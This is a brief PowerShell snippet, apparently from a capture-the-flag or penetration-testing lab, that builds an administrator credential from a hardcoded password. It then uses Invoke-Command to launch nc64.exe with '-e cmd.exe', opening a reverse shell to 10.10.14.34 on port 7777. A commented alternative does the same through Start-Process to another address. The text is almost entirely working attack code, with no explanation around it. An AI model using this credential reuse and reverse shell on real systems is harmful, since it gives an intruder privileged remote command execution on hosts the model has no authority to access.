$username='administrator'
$password='MEGACORP_4dm1n!!'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-Command -ScriptBlock {C:\Users\sql_svc\Desktop\nc64.exe 10.10.14.34 7777 -e cmd.exe} -Credential $credential -computername localhost

### Option 2 {SUBSTITUTE LINE 5}
# Start-Process .\nc.exe -ArgumentList '10.10.xx.xx 4445 -e cmd.exe' -Credential $credential
